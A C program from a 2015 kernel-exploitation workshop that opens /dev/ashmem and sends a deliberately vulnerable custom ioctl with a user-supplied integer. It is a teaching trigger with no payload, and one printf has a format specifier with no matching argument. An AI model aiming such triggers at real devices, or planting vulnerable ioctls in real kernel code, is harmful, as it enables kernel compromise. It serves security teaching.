/*
* this file is used during the kernel tales workshop 
* to be compiled like this:  aarch64-linux-android-gcc -fPIC -pie trigger.c -o trigger
* to be used like this: trigger <int value>
* by Vito Rallo
*/


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>		/* open */
#include <unistd.h>		/* exit */
#include <sys/ioctl.h>		/* ioctl */
#include <linux/ashmem.h>

/* as ashmem.h from bionic does not include our custom command */

#define ASHMEM_VULN	_IOR(__ASHMEMIOC, 11, int)

int call_ioctl(int i) {
	int file_desc,ret;
	file_desc = open("/dev/ashmem", 0);
	if (file_desc < 0) {
		printf("Can't open device file: /dev/ashmem %s\n");
		exit(-1);
	}
	printf ("sending ioctl request with value: %d\n", i);
	ret = ioctl(file_desc, ASHMEM_VULN, &i);
	printf ("ret = %d\n",ret);
	return ret;
}

int main ( int argc, char *argv[] )
{
	int i;

	printf("Trigger for the vulnerable ioctl\n");
	printf("Vito Rallo (Kernel Tales - 2015) \n\n");
	if (argc<2) {
		printf("usage: trigger <an int value>\n");
		exit(-1);
	}
	i = atoi(argv[1]);
	return call_ioctl(i);
}
